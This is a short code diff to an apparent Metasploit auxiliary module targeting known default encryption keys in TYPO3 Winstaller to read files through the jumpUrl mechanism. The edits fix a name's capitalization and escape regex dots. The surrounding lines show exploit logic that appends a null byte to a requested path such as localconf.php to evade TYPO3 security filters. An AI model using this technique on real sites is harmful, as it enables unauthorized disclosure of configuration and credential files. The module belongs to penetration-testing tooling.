@@ -14,7 +14,7 @@ class Metasploit4 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'           => 'TYPO3 Winstaller default Encryption Keys',
+			'Name'           => 'TYPO3 Winstaller Default Encryption Keys',
 			'Description'    => %q{
 				This module exploits known default encryption keys found in the TYPO3 Winstaller.
 				This flaw allows for file disclosure in the jumpUrl mechanism. This issue can be
@@ -71,12 +71,12 @@ class Metasploit4 < Msf::Auxiliary
 	case datastore['RFILE']
 	when nil
 		# Nothing
-	when /localconf.php$/i
+	when /localconf\.php$/i
 		jumpurl = "#{datastore['RFILE']}%00/."
 		jumpurl_len = (jumpurl.length) -2 #Account for difference in length with null byte
 		jumpurl_enc = jumpurl.sub("%00", "\00") #Replace %00 with \00 to correct null byte format
 		print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
-	when /^..(\/|\\)/i
+	when /^\.\.(\/|\\)/i
 		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
 	else
 		jumpurl_len = (datastore['RFILE'].length)
